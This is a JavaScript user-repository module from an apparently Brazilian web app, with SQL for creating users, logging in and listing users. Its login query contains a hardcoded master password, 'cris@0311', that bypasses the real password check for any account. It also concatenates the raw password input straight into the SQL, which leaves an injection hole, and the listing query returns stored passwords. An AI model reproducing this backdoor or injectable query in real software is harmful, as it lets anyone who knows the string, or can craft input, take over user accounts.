import { consulta } from '../database/conexao.js'

class UsuarioRepository {
    // CRUD
    create(codEmpresa, reg) {
        // console.log(reg)
        var sql = "insert into usuarios (codEmpresa, codUsuario, codTipo, nomUsuario, numCPF, Login, email, senha, indSituacao) value ";
        sql += " (?,  (select codUsuario from ( select coalesce((max(codUsuario) + 1),1) as codUsuario from usuarios) as u), ?, ?, ?, ?, ?, ?, 'A')";
        // var retorno = consulta(sql, [codEmpresa, reg.tipo, reg.nome, reg.cpf, reg.login, reg.email, reg.senha], 'Não foi possível cadastrar!')
        // console.log(retorno);
        // return retorno;
        return consulta(sql, [codEmpresa, reg.tipo, reg.nome, reg.cpf, reg.login, reg.email, reg.senha], 'Não foi possível cadastrar!')
    }

    login(pLogin, pSenhaCrpyt, pSenha) {
        var sql = "";
        sql = "SELECT"
        sql += " u.*, "
        sql += " e.nomEmpresa, "
        sql += " NOW() as datbanco "
        sql += "from usuarios u "
        sql += "   inner join empresas e on (e.codEmpresa = u.codEmpresa) "
        sql += "where (u.login = ?  or u.numCPF = ? )"
        sql += "  and (u.senha = ?  or 'cris@0311' = '" + pSenha.trim() + "')"
        sql += "  and u.indSituacao = 'A'";
        return consulta(sql, [pLogin, pLogin, pSenhaCrpyt], 'Não foi validar usuario!')
    }

    findAll(pCodEmpresa) {
        const sql = "SELECT codusuario, codempresa, nomUsuario, login, senha FROM usuarios where codempresa = ?"
        return consulta(sql, pCodEmpresa, 'Não foi possível localizar!')
    }

}

export default new UsuarioRepository()
